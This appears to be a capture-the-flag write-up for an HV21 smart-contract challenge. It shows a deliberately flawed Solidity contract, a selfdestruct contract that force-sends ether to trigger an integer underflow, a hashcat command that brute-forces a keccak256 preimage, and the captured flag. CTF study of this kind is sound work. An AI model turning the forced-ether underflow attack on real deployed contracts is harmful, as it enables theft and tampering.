# 13 - Super Smart Santa

## Description

Santa wanted to be modern, so he asked his elves to transfer his gift contracts to Solidity. Did they do well?
Complete the contract! Meaning: set `isComplete` to `true`.

## Solution

This was my first time trying smart contracts so I had to read up on a lot of things first. We are given a website that
lets us deploy a smart contract with the following source:

```
pragma solidity 0.4.22;

contract Santa {
	uint24 a;
	bytes32 b = 0x0619c10213c814eba28106f6c2472c5853b55a7c25855da514b806efc1128e55;
	bool public isComplete;
	bool c;
	uint256 d;

	constructor() public payable {
		require(msg.value == 0.0000000000000001 ether);
		d = msg.value;
	}

	function e() public {
		if (keccak256(a) == b){
			isComplete = true;
		}
	}

	function f(int24 g) public{
		require(c);
		a = uint24((0xdeadbeef) <<- (-31337) % 1337 >> (188495400 / 314159)) + uint24(g);
	}

	function h() public {
		uint256 i = d - address(this).balance;
		require(i > 0);
		c = true;
	}
}
```

The goal is to set `isComplete` to true by calling `e()`. To do that there are two steps required:

### Intger overflow & Selfdestruct 

First of all we have to set `c` to `true`. In `h` we can set `c` to true but only if `i > 0`. So how do we do this? The
answer is integer overflows! As long as we somehow get the balance to increase, we can overflow the variable `i`. But
how do we get ether to the contract that only has a `payable` constructor? [We can self destruct another contract to
send ether](https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988). By
doing so we transfer the remaining ether to the contract and overflow `i`.

An example of such a selfdestruct contract is the following:
```
contract Attack {
    constructor() { }

    function attack() public payable {
        address payable addr = payable(address(0x...));
        selfdestruct(addr);
    }
}
```

### Keccak256 Hash

The second part of the challenge involves the function `f`. We have to get `a` to be the 24-bit value that hashes to
`0x0619c10213c814eba28106f6c2472c5853b55a7c25855da514b806efc1128e55`. This can be done using hashcat:

```
hashcat -a 3 -m 17800 0619c10213c814eba28106f6c2472c5853b55a7c25855da514b806efc1128e55 "?b?b?b"
```

After a few seconds we get the answer: `dec0de`. The function `f` can be simplified to:

```
function f(int24 g) public{
	require(c);
	a = uint24(228022) + uint24(g);
}
```

Since we want `a` to be `dec0de`, we just have to set `g` to the correct value and we are done. The correct value can be
found using:

```
uint24 a = 0xdec0de;
int24 g = int24(a - uint24(228022));
```

`g` has to be `-2406872` and then the hash will be computed correctly.

### Execution

Now that everything is prepared, we just have to run it:

1. Create a wallet using MetaMask
2. Get some eth from [a faucet](https://faucet.egorfine.com/)
3. Deploy the contract and get its address
4. Deploy the attack contract from above and set the selfdestruct to the correct address
5. Call `attack()` with some eth
6. On the original contract
   1. Call `h()` 
   2. Call `f(-2406872)`
   3. Call `e()`
9. Get the flag `HV21{sm4rt->sm4rter->y0u}`

